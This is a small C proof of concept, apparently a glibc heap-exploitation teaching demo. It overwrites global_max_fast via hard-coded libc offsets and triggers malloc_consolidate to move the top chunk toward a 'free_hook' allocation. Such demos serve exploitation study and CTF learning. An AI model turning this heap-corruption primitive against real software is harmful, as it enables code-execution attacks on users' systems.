#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6d640;
    size_t global_max_fast=libc_addr+0x3ad8f0;
    return global_max_fast;
}

int main()
{   
    setvbuf(stdout, NULL, _IONBF, 0);  
    size_t* chunk1=malloc(0x500);
    malloc(0x20);
    free(chunk1);
    malloc(0x200); // after split is in smallbin range so become last_remainder
    size_t* global_max_fast=getlibc();

    size_t* fastchunk[0x10];
    for(int i=1;i<=8;i++)
    {
        fastchunk[i]=malloc(0x10);
        
    }
    malloc(0x10); //padding
     for(int i=1;i<=8;i++)
    {
        free(fastchunk[i]);// have_fastchunks 
    }  
    printf("global_max_fast %p\n",global_max_fast);
    *global_max_fast=0;  //set  global_max_fast 0
    malloc(0x600+0x1610);    // malloc largebin size strike malloc_consolidate  to make top change

    char* free_hook=malloc(0x20);
    printf("free_hook  %p\n",free_hook);
}